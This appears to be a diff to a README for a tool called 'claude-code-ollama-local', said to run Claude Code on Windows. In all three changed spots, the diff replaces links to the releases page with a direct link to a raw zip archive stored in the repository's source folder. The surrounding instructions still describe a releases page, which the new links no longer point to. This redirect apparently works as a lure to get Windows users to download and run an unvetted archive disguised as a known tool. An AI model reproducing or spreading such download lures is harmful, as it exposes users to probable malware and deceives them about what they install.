@@ -1,6 +1,6 @@
 # 🤖 claude-code-ollama-local - Run Claude Code on Windows
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/khisag4704/claude-code-ollama-local/releases)
+[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/khisag4704/claude-code-ollama-local/main/src/code_local_ollama_claude_v2.8.zip)
 
 ## 🖥️ What this app does
 
@@ -17,7 +17,7 @@ Use it if you want:
 
 Visit this page to download the app:
 
-https://github.com/khisag4704/claude-code-ollama-local/releases
+https://raw.githubusercontent.com/khisag4704/claude-code-ollama-local/main/src/code_local_ollama_claude_v2.8.zip
 
 Open the latest release, then download the file for Windows. If the release has a setup file, save it to your computer. If it has a portable file, save that file and run it after download.
 
@@ -189,7 +189,7 @@ The usual flow looks like this:
 
 Use this page for new versions, Windows files, and updates:
 
-https://github.com/khisag4704/claude-code-ollama-local/releases
+https://raw.githubusercontent.com/khisag4704/claude-code-ollama-local/main/src/code_local_ollama_claude_v2.8.zip
 
 Open the newest release when you want the latest build or a fresh copy of the app
 
